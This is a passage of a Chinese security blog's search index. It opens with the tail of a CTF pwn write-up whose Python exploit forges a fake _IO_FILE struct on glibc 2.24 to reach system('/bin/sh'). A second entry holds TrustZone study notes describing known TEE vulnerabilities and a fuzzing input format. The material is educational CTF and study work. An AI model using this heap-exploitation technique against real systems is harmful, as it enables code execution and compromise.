==&gt; small bin[5] (size = 0x60)# fake a _IO_FILE struct in small bin[4] by writing the unsorted bin# make use of _IO_str_jumps-&gt;_IO_str_finishpayload = &quot;E&quot; * 0x30 payload += pack_file_flush_str_jumps(_IO_str_jumps, _IO_list_all, main_arena, system, str_bin_sh)edit(0x300, payload + &quot;\n&quot; , 217, 108)#create(0x100, &quot;D&quot; * 7 + &quot;\n&quot;, 217, 108)success(&quot;main_arena: &quot; + hex(main_arena))success(&quot;libc_base: &quot; + hex(libc_base))success(&quot;_IO_list_all: &quot; + hex(_IO_list_all))success(&quot;_IO_str_jumps: &quot; + hex(_IO_str_jumps))success(&quot;system: &quot; + hex(system))success(&quot;str_bin_sh: &quot; + hex(str_bin_sh))p.interactive()</code></pre><h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><ol><li>在触发malloc_printerr之后，size=0x60的unsorted bin是怎么进入到small bin的机制还不是很清楚</li><li>除了利用<code>_IO_str_finish</code>之外，还可以利用<code>_IO_str_overflow</code>，不过好像稍微复杂一点，没有尝试</li><li>glibc==2.24的情况下利用IO_FILE结构体攻击的方法不限于此种，还有其他利用方法没有尝试</li></ol><h3 id="相关链接"><a href="#相关链接" class="headerlink" title="相关链接"></a>相关链接</h3><p>学习了其他大佬们的文章以及<a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/io_file/exploit-in-libc2.24-zh/" target="_blank" rel="noopener">CTF wiki</a></p><ol><li><a href="https://xz.aliyun.com/t/5579" target="_blank" rel="noopener">https://xz.aliyun.com/t/5579</a></li><li><a href="https://www.jianshu.com/p/1e45b785efc1" target="_blank" rel="noopener">https://www.jianshu.com/p/1e45b785efc1</a></li></ol>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>关于TEE的一些预备知识</title>
      <link href="/2020/01/24/%E5%85%B3%E4%BA%8ETEE%E7%9A%84%E4%B8%80%E4%BA%9B%E9%A2%84%E5%A4%87%E7%9F%A5%E8%AF%86/"/>
      <url>/2020/01/24/%E5%85%B3%E4%BA%8ETEE%E7%9A%84%E4%B8%80%E4%BA%9B%E9%A2%84%E5%A4%87%E7%9F%A5%E8%AF%86/</url>
      
        <content type="html"><![CDATA[<h3 id="常见缩略词："><a href="#常见缩略词：" class="headerlink" title="常见缩略词："></a>常见缩略词：</h3><ul><li><b>REE</b>: Rich Execution Environment</li><li><b>TEE</b>: Trusted Execution Environment</li><li><b>OP-TEE</b>: Open Portable Trusted Execution Environment</li><li><b>SoC</b>: System on Chip</li><li><b>RPK</b>: Real-Time Kernel Protection</li><li><b>PKM</b>: Periodic Kernel Measurement</li><li><b>SMC</b>: Secure Monitor Call</li><li><b>SCM</b>: Secure Channel Manager</li><li><b>ATF</b>: ARM-Trusted-Firmware </li><li><b>OTA</b>: Over-The-Air</li><li><b>FIQ</b>: Fast Interrupt Request (Internal)</li><li><b>IRQ</b>: Interrupt Request (External)</li><li><b>TZASC</b>: TrustZone Address Space Controller</li><li><b>TZPC</b>: TrustZone Protection Controller</li><li><b>TZMA</b>: TrustZone Memory Adapter</li><li><b>TCB</b>: Trusted Computing Base</li><li><b>HIEE</b>: Hardware-assisted Isolated Execution Environments</li></ul><h3 id="不同架构下或不同应用中的TEE-Real-Product"><a href="#不同架构下或不同应用中的TEE-Real-Product" class="headerlink" title="不同架构下或不同应用中的TEE (Real Product)"></a>不同架构下或不同应用中的TEE (Real Product)</h3><ul><li>TPM (Trusted Platform Module)</li><li></li><li>ARM TrustZone</li><li>ARM SCP (System Co Processor)</li><li>Intel SMM (System Management Mode)</li><li>Intel TXT (Trusted Execution Technology)</li><li>Intel SGX (Software Guarded Extension)</li><li>Intel ME (Management Engine)</li><li>AMD PSP (Platform Security Processor)</li><li></li><li>Google Titan</li><li>MS Azure Pluton</li><li>Apple Secure Enclave</li><li>Apple T2</li></ul><h3 id="ARM-TrustZone-Exception-Levels"><a href="#ARM-TrustZone-Exception-Levels" class="headerlink" title="ARM TrustZone Exception Levels"></a>ARM TrustZone Exception Levels</h3><p><img src="/2020/01/24/%E5%85%B3%E4%BA%8ETEE%E7%9A%84%E4%B8%80%E4%BA%9B%E9%A2%84%E5%A4%87%E7%9F%A5%E8%AF%86/ARM_TrustZone.png" alt="ARM TrustZone Exception Levels"></p><h3 id="TrustZone-attack-surface"><a href="#TrustZone-attack-surface" class="headerlink" title="TrustZone attack surface"></a>TrustZone attack surface</h3><ul><li>The handler of messages addressed directly to the monitor.<blockquote><p>函数<code>tzbsp_es_is_activated</code>存在漏洞，允许在任意指定地址（包括TrustZone monitor和 kernel）写入一个0（DWORD），可实现在EL3中执行任意代码。</p></blockquote></li><li>Third-party applications (trustlets) running in TrustZone.<blockquote><p>由<code>tz_otp</code>提供的<code>otp_resync_account</code>函数中存在<code>BLE</code>指令（有符号比较），导致传入负数参数时，分支指令总会跳转到包含<code>memcpy</code>函数的特定分支中，并且该<code>memcpy</code>函数的<code>length</code>和<code>src</code>参数都由攻击者提供，因此可以导致栈溢出漏洞，从而实现在Secure World EL0的情况下实现任意代码执行。</p></blockquote></li><li>The Secure Boot component, which may allow code execution before the loading of the TrustZone and thus the ability to subvert the TrustZone itself.</li></ul><h3 id="Syscall-calls-as-data-for-fuzzing"><a href="#Syscall-calls-as-data-for-fuzzing" class="headerlink" title="Syscall calls as data(for fuzzing)"></a>Syscall calls as data(for fuzzing)</h3><h4 id="参数类型："><a href="#参数类型：" class="headerlink" title="参数类型："></a>参数类型：</h4><pre><code class="C">typedef enum {    ARG_NONE,    ARG_VALUE_NULL,    ARG_VALUE_8,    ARG_VALUE_16,    ARG_VALUE_32,    ARG_VALUE_64,    ARG_BUFFER_ALLOC,    ARG_BUFFER_REF,    ARG_BUFFER_DEREF32,    ARG_BUFFER_DEREF64,    ARG_DATA_SHARED,    ARG_DATA_PRIVATE,    ARG_RETURN_VALUE,    ARG_TYPE_MAX} svc_arg_type_t;</code></pre><h4 id="举例"><a href="#举例" class="headerlink" title="举例:"></a>举例:</h4><pre><code>00000000: 0100 0000 4a00 0000 1800 0001 1000 0000 ....J...........00000010: ff00 0000 0000 0000 0a48 656c 6c6f 204e .........Hello N00000020: 756c 6c63 6f6e 2100 ullcon!.</code></pre><blockquote><p>小端数据，如dead beef的值为0xefbeadde</p></blockquote><ul><li><code>0x0-0x3</code>bytes: syscall id == 0x00000001</li><li><code>0x4-0x7</code>bytes: arguments type == 0x0000004a(一个nibble代表一个参数，顺序从低到高)</li><li><code>0x8-0xB</code>bytes: arg1，buffer类型参数的偏移和长度，0x010 00018前3bits表示长度为0x10，后5bits表示偏移为0x18</li><li><code>0xC-0xF</code>bytes: arg2, _int32类型参数的值，0x00000010即值为0x10</li><li><code>0x10-0x17</code>bytes: 表示分隔，固定值</li><li><code>0x18-0x27</code>bytes: 对应字符串参数</li></ul><h4 id="再举例："><a href="#再举例：" class="headerlink" title="再举例："></a>再举例：</h4><p><img src="/2020/01/24/%E5%85%B3%E4%BA%8ETEE%E7%9A%84%E4%B8%80%E4%BA%9B%E9%A2%84%E5%A4%87%E7%9F%A5%E8%AF%86/syscall_data.png" alt="syscall data"></p>]]></content>
      
      
      <categories>
          
          <category> LearningNotes </category>
          
      </categories>
      
      
        <tags>
            
            <tag> TrustZone </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
